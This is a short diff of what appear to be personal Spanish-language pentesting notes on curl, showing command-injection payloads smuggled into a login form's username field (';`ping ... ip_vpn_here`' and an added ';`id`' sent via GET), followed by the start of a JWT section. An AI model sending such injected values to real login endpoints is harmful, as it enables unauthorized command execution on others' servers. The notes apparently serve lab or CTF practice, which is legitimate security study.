@@ -30,6 +30,12 @@
 	:::  curl  -s  -X POST  http://test.test/test/login  --data-urlencode 'username=;`ping -c 4 -4 ip_vpn_here`'     "encodea con --data-urlencode ......<3 <3 <3"
 
 
+	:::  curl  -s  -X GET  -G  http://test.test/test/login  -H "...."  --data-urlencode 'username=;`id`'
+
+													-G   para --data-urlencode, los datos viajan en la URL como parte de la consulta no en el cuerpo(POST)
+													-G   tramita data por GET
+
+
     *** *** JSON WEB TOKEN
 
 			::: curl  -s  -X POST http://$(mvnb):3000/api/user/register  -H "Content-Type: application/json"  -d '{"name": "nameTest", "email": "emailTest@test.com", "password": "testPassword1234"}'
